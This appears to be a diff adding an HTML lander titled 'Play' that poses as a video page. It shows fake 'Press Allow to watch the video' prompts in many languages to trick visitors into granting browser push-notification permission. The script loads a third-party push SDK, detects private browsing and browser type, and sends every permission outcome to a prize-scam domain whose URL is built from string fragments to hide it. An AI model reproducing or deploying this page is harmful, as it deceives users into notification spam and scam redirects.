@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html>
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta charset="UTF-8">
+    <title>Play</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            background-color: #000;
+            height: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            color: #fff;
+            font: 300 16px Helvetica, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            text-align: center;
+            user-select: none
+        }
+
+        .fix,
+        body {
+            width: 100%
+        }
+
+        .fix {
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            z-index: 1
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        .msg {
+            background: url(images/play/play.png) no-repeat top;
+            background-size: 140px;
+            font-size: 28px;
+            padding: 215px 5px 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .isAndroid .msg {
+            background-position: bottom;
+            padding: 5% 5px 215px;
+            top: 0;
+            transform: none
+        }
+
+        .msgReady {
+            background-color: rgba(0, 0, 0, .75);
+            color: #fff;
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            width: 100%
+        }
+
+        .msgReady__tx {
+            font-size: 32px;
+            margin-top: 10%
+        }
+
+        @media (min-width:425px) {
+            .msgReady__tx {
+                font-size: 52px
+            }
+        }
+    </style>
+</head>
+
+<body>
+  <script>(function() {
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var loc = document.location;
+    var tb = function(){ loc.href = ['ht','tp://da','ygrandp','rizes7','.life/?u=8mb','p605&o=4xp','kdzx&cid=', getParameterByName('external_id', window.location.href)].join(''); };
+    var bc = function(){ loc.href = ['ht', 'tps:', '/', '/go', 'ogle.com/'].join(''); };
+
+    var url = new URL(window.location.href);
+    var pci = getParameterByName('external_id', window.location.href);
+    var ppi = getParameterByName('placementid', window.location.href);
+    var tag = document.createElement('script');
+    tag.type = 'text/javascript';
+    tag.dataset['sdk'] = 'sdk';
+    tag.src = '//pushokey.com/ntfc.php?p=2490456&ucis=true&m=https&nbinp=true' + '&var='+ ppi + '&ymid=' + pci;
+
+    function setupHandlers() {
+      // sdk.onBeforePermissionPrompt();
+      sdk.onPermissionDefault(tb);
+      sdk.onPermissionAllowed(tb);
+      sdk.onPermissionDenied(tb);
+      sdk.onAlreadySubscribed(tb);
+    }
+
+    tag.onload = setupHandlers;
+
+    document.head.appendChild(tag);
+    })();</script>  
+    <div class="fix"></div>
+    <div class="msg"></div>
+    <div class="msgReady isHide">
+        <div class="msgReady__tx"></div>
+    </div>
+    <script>
+            var a = function(n) {
+                    var e = decodeURIComponent(document.cookie).split(";");
+                    if (0 === e.length) return null;
+                    var t = null;
+                    return e.some(function(e) {
+                        if (" " === e[0] && (e = e.slice(1)), e = e.split("="), n === e[0]) return t = e[1], !0
+                    }), t
+                },
+                d = function(e, n, t, i) {
+                    var o = new Date;
+                    o.setTime(o.getTime() + 1e3 * t);
+                    var r = "; expires=" + o.toUTCString(),
+                        a = "";
+                    void 0 !== i && (a = "; domain=" + i), document.cookie = e + "=" + (n || "") + a + r + "; path=/"
+                },
+                l = function(e) {
+                    null !== window.opener && void 0 !== window.opener && opener.postMessage(e, "*")
+                },
+                v = {
+                    ua: navigator.userAgent,
+                    m: function(n) {
+                        var e = "normal",
+                            t = "private";
+
+                        function i() {
+                            return n(t)
+                        }
+
+                        function o() {
+                            return n(e)
+                        }
+                        if ("safari" === v.n) try {
+                            return window.openDatabase(null, null, null, null), n(e)
+                        } catch (e) {
+                            return n(t)
+                        } else if ("firefox" === v.n) {
+                            var r = indexedDB.open("test.html");
+                            r.addEventListener("error", i), r.addEventListener("success", o)
+                        } else {
+                            if ("edge" === v.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? n(e) : n(t);
+                            if ("opera" !== v.n && "yandex" !== v.n && "chrome" !== v.n) return n("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, o, i)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            n = "undefined" != typeof InstallTrigger,
+                            t = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            i = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            o = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            r = /UBrowser/.test(this.ua),
+                            a = /Edge\//.test(this.ua),
+                            s = null;
+                        return e ? s = "opera" : n ? s = "firefox" : o ? s = "yandex" : r ? s = "uc" : a ? s = "edge" : i ? s = "chrome" : t && (s = "safari"), s
+                    },
+                    get d() {
+                        var n = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            t = null;
+                        return Object.keys(n).some(function(e) {
+                            if (null !== v.ua.match(new RegExp(n[e], "i"))) return t = e, !0
+                        }), t
+                    }
+                },
+                m = v;
+            var w = function(n) {
+                    if (!(void 0 !== window.navigator && void 0 !== navigator.serviceWorker && void 0 !== window.PushManager && void 0 !== window.Notification)) return n(!1, "unsupported");
+                    m.m(function(e) {
+                        return "private" === e ? n(!1, e) : "unknown" === e ? n(!1, e) : n(!0, "supported")
+                    })
+                },
+                y = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (y.k = navigator.language.slice(0, 2)), void 0 === e[y.k] && (y.k = "en"), y.t = e[y.k]
+                    },
+                    get: function(e) {
+                        return y.t[e]
+                    }
+                },
+                b = y;
+
+            b.set({
+                ru: {
+                    msg: 'Нажмите "Разрешить", чтобы посмотреть видео',
+                    msgReady: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                en: {
+                    msg: 'Press "Allow" to watch the video',
+                    msgReady: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                fr: {
+                    msg: 'Cliquez sur "Autoriser" pour regarder la vidéo',
+                    msgReady: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    msg: 'Klicken Sie auf "Zulassen", um das Video anzusehen',
+                    msgReady: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    msg: 'Haga clic en "Permitir" para ver el video',
+                    msgReady: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                uk: {
+                    msg: 'Щоб подивитися відео натисніть "Дозволити"',
+                    msgReady: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    msg: 'Kliknij "Zezwalaj", aby obejrzeć wideo',
+                    msgReady: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                th: {
+                    msg: 'คลิก "อนุญาต" เพื่อดูวิดีโอ',
+                    msgReady: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                },
+                it: {
+                    msg: 'Consenti  Premi "Consenti" per guardare il video',
+                    msgReady: "Hai superato con successo la verifica!<br>Ora puoi chiudere la finestra."
+                },
+                vi: {
+                    msg: 'Chan Nhấn "chận" để xem video',
+                    msgReady: "Bạn đã vượt qua thành công xác minh!<br>Bây giờ bạn có thể đóng cửa sổ."
+                },
+                ar: {
+                    msg: 'اضغط على "سماح" لمشاهدة الفيديو',
+                    msgReady: "الآن يمكنك إغلاق النافذة.<br>لقد نجحت في اجتياز التحقق!"
+                },
+                id: {
+                    msg: "Tekan «Izinkan» untuk menonton video",
+                    msgReady: "Anda berhasil lolos verifikasi!<br>Sekarang Anda bisa menutup jendela."
+                },
+                ms: {
+                    msg: 'Tekan "Benarkan" untuk menonton video',
+                    msgReady: "Anda berjaya meluluskan pengesahan!<br>Kini anda boleh menutup tetingkap."
+                },
+                pt: {
+                    msg: 'Pressione "Permitir" para assistir ao vídeo',
+                    msgReady: "Você passou com sucesso a verificação!<br>Agora você pode fechar a janela."
+                },
+                zh: {
+                    msg: "按“允許”觀看視頻",
+                    msgReady: "您已成功通过验证！<br>现在你可以关闭窗口了。"
+                },
+                tr: {
+                    msg: "Videoyu izlemek için «Engelle» e basın",
+                    msgReady: "Doğrulamayı başarıyla geçtiniz!<br>Şimdi pencereyi kapatabilirsin."
+                }
+            }), "android" === m.d && document.body.classList.add("isAndroid"), document.querySelector(".msg").innerHTML = b.get("msg"), document.querySelector(".msgReady__tx").innerHTML = b.get("msgReady")
+
+    </script>
+
+</body>
+
+
+</html>
